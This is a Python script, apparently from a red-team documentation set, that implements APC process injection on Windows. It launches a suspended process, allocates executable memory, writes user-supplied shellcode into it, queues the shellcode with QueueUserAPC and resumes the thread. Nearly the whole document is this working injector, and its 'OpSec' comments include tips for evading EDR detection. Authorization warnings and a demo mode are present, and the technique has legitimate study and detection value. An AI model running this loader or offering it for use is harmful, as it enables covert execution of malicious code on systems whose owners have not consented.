#!/usr/bin/env python3
"""
Script Name: apc_injection.py
Purpose: Demonstrates APC (Asynchronous Procedure Call) injection using Python ctypes
         Creates a suspended process and injects shellcode via QueueUserAPC
Author: OpSec Documentation Team
Date: 2026-02-15
Version: 1.0

MITRE ATT&CK: T1055.004 (Process Injection: Asynchronous Procedure Call)

OpSec Considerations:
- Generates Windows Event ID 4688 (Process Creation)
- Creates suspicious process relationships (parent/child)
- May trigger ETW (Event Tracing for Windows) telemetry
- Sysmon may log Event ID 10 (ProcessAccess) or Event ID 8 (CreateRemoteThread)
- Memory artifacts may be detected by EDR solutions
- Use only in isolated test environments
- Consider process hollowing as alternative with different IOCs

WARNING: For authorized security testing only.
         Use only on systems you have explicit permission to test.
"""

import ctypes
import ctypes.wintypes as wintypes
import argparse
import sys
import base64

# Windows API constants
# OpSec: These constants are well-known indicators
PROCESS_ALL_ACCESS = 0x1F0FFF
CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

class APCInjection:
    """
    APC Injection demonstration class.
    
    This class demonstrates the APC injection technique where shellcode is
    injected into a suspended process and executed via QueueUserAPC.
    
    OpSec: This is a well-known technique with many detection signatures.
    Modern EDR solutions often monitor for these API calls in sequence.
    """
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def create_suspended_process(self, target_path):
        """
        Create a suspended process for injection.
        
        Args:
            target_path: Path to executable to launch suspended
            
        Returns:
            tuple: (process_handle, thread_handle, process_id)
            
        OpSec: CREATE_SUSPENDED flag is a common detection indicator.
        Suspended processes with no activity may trigger behavioral analysis.
        """
        # Initialize STARTUPINFO and PROCESS_INFORMATION structures
        startup_info = ctypes.create_string_buffer(68)  # sizeof(STARTUPINFO)
        ctypes.cast(startup_info, ctypes.POINTER(ctypes.c_ulong))[0] = 68  # cb = sizeof(STARTUPINFO)
        
        process_info = ctypes.create_string_buffer(16)  # sizeof(PROCESS_INFORMATION)
        
        # OpSec: CreateProcess with CREATE_SUSPENDED is suspicious
        # Consider using legitimate processes that typically start suspended
        success = self.kernel32.CreateProcessW(
            None,  # Application name
            target_path,  # Command line
            None,  # Process security attributes
            None,  # Thread security attributes
            False,  # Inherit handles
            CREATE_SUSPENDED,  # Creation flags - OpSec: Suspicious flag
            None,  # Environment
            None,  # Current directory
            startup_info,  # Startup info
            process_info   # Process information
        )
        
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())
        
        # Extract handles from PROCESS_INFORMATION
        # Structure: hProcess (4/8 bytes), hThread (4/8 bytes), dwProcessId (4 bytes), dwThreadId (4 bytes)
        proc_info_arr = ctypes.cast(process_info, ctypes.POINTER(ctypes.c_void_p))
        process_handle = proc_info_arr[0]
        thread_handle = proc_info_arr[1]
        process_id = ctypes.cast(ctypes.addressof(proc_info_arr) + 16, ctypes.POINTER(ctypes.c_ulong)).contents.value
        
        print(f"[*] Created suspended process: PID {process_id}")
        return process_handle, thread_handle, process_id
    
    def allocate_memory(self, process_handle, size):
        """
        Allocate executable memory in target process.
        
        Args:
            process_handle: Handle to target process
            size: Size of memory to allocate
            
        Returns:
            int: Base address of allocated memory
            
        OpSec: PAGE_EXECUTE_READWRITE is highly suspicious.
        Consider using PAGE_READWRITE then PAGE_EXECUTE via VirtualProtect.
        """
        # OpSec: VirtualAllocEx with RWX permissions is a major red flag
        base_address = self.kernel32.VirtualAllocEx(
            process_handle,
            None,  # Let system determine address
            ctypes.c_size_t(size),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE  # OpSec: RWX memory is suspicious
        )
        
        if not base_address:
            raise ctypes.WinError(ctypes.get_last_error())
        
        print(f"[*] Allocated {size} bytes at 0x{base_address:x}")
        return base_address
    
    def write_memory(self, process_handle, base_address, data):
        """
        Write shellcode to allocated memory.
        
        Args:
            process_handle: Handle to target process
            base_address: Address to write to
            data: Bytes to write
            
        Returns:
            bool: Success status
            
        OpSec: WriteProcessMemory to RWX regions is suspicious.
        May trigger memory scanning by EDR solutions.
        """
        size_written = ctypes.c_size_t(0)
        
        success = self.kernel32.WriteProcessMemory(
            process_handle,
            ctypes.c_void_p(base_address),
            data,
            ctypes.c_size_t(len(data)),
            ctypes.byref(size_written)
        )
        
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())
        
        print(f"[*] Wrote {size_written.value} bytes to target process")
        return True
    
    def queue_apc(self, thread_handle, base_address):
        """
        Queue an APC to the target thread.
        
        Args:
            thread_handle: Handle to thread
            base_address: Address of shellcode (APC routine)
            
        Returns:
            bool: Success status
            
        OpSec: QueueUserAPC with memory address from VirtualAllocEx is suspicious.
        Normal APCs typically point to legitimate DLL functions.
        """
        # OpSec: QueueUserAPC is a key indicator of APC injection
        result = self.kernel32.QueueUserAPC(
            ctypes.c_void_p(base_address),  # APC routine (our shellcode)
            thread_handle,
            None  # Parameter
        )
        
        if result == 0:
            raise ctypes.WinError(ctypes.get_last_error())
        
        print("[*] APC queued successfully")
        return True
    
    def resume_thread(self, thread_handle):
        """
        Resume the suspended thread to execute APC.
        
        Args:
            thread_handle: Handle to thread
            
        Returns:
            int: Previous suspend count
            
        OpSec: Resuming a suspended process that immediately executes 
        unknown code may trigger behavioral detection.
        """
        result = self.kernel32.ResumeThread(thread_handle)
        
        if result == -1:
            raise ctypes.WinError(ctypes.get_last_error())
        
        print("[*] Thread resumed, APC should execute")
        return result
    
    def cleanup(self, process_handle, thread_handle):
        """
        Clean up handles.
        
        Args:
            process_handle: Process handle to close
            thread_handle: Thread handle to close
            
        OpSec: Proper cleanup reduces forensic artifacts.
        However, the injected code may have already created artifacts.
        """
        if thread_handle:
            self.kernel32.CloseHandle(thread_handle)
        if process_handle:
            self.kernel32.CloseHandle(process_handle)
        print("[*] Handles closed")


def main():
    """
    Main entry point for APC injection demonstration.
    
    This is a demonstration script showing the APC injection technique.
    For actual testing, use legitimate shellcode or a simple MessageBox payload.
    
    OpSec: This script demonstrates technique only - do not use malicious payloads.
    """
    parser = argparse.ArgumentParser(
        description='APC Injection Technique Demonstration (FOR AUTHORIZED TESTING ONLY)',
        epilog='WARNING: Use only on systems you have permission to test!'
    )
    
    parser.add_argument(
        '--target', 
        default='C:\\Windows\\System32\\notepad.exe',
        help='Target executable to inject into (default: notepad.exe)'
    )
    
    parser.add_argument(
        '--payload',
        help='Base64 encoded shellcode (for testing only - use benign payloads)'
    )
    
    parser.add_argument(
        '--demo',
        action='store_true',
        help='Demo mode - shows technique without actual injection'
    )
    
    args = parser.parse_args()
    
    print("="*60)
    print("APC Injection Technique Demonstration")
    print("FOR AUTHORIZED SECURITY TESTING ONLY")
    print("="*60)
    print()
    
    # OpSec: Always confirm authorization
    confirm = input("Have you obtained authorization to test this system? [yes/no]: ")
    if confirm.lower() != 'yes':
        print("[!] Aborting - authorization not confirmed")
        sys.exit(1)
    
    if args.demo:
        print("[*] DEMO MODE: Showing technique steps without execution")
        print("[*] Target process:", args.target)
        print("[*] Steps that would be performed:")
        print("    1. CreateProcessW with CREATE_SUSPENDED")
        print("    2. VirtualAllocEx with PAGE_EXECUTE_READWRITE")
        print("    3. WriteProcessMemory with shellcode")
        print("    4. QueueUserAPC pointing to shellcode")
        print("    5. ResumeThread to trigger execution")
        print("[*] Demo complete - no actual injection performed")
        return
    
    # Example benign payload - MessageBox "Test"
    # This is x86-64 shellcode that shows a message box
    # In production testing, use your own benign payload or testing framework
    if not args.payload:
        print("[!] No payload provided - use --demo for technique demonstration")
        print("[!] Or provide --payload with base64 encoded shellcode")
        sys.exit(1)
    
    try:
        # Decode payload
        shellcode = base64.b64decode(args.payload)
        
        # Initialize injector
        injector = APCInjection()
        
        # Execute injection steps
        print(f"[*] Target: {args.target}")
        
        # Step 1: Create suspended process
        # OpSec: Suspended process creation is logged
        process_handle, thread_handle, pid = injector.create_suspended_process(args.target)
        
        # Step 2: Allocate executable memory
        # OpSec: RWX allocation is highly suspicious
        base_address = injector.allocate_memory(process_handle, len(shellcode))
        
        # Step 3: Write shellcode
        # OpSec: Write to RWX memory is suspicious
        injector.write_memory(process_handle, base_address, shellcode)
        
        # Step 4: Queue APC
        # OpSec: APC to RWX memory is the injection trigger
        injector.queue_apc(thread_handle, base_address)
        
        # Step 5: Resume thread
        # OpSec: Thread resumption executes payload
        injector.resume_thread(thread_handle)
        
        print(f"[*] Injection complete in PID {pid}")
        print("[!] Monitor the target process for execution")
        
        # Cleanup
        injector.cleanup(process_handle, thread_handle)
        
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    # OpSec: Check if running on Windows
    if sys.platform != 'win32':
        print("[!] This script requires Windows (uses Windows APIs)")
        print("[*] For educational purposes, the code demonstrates the technique")
        print("[*] Windows API calls will fail on non-Windows systems")
        sys.exit(1)
    
    main()
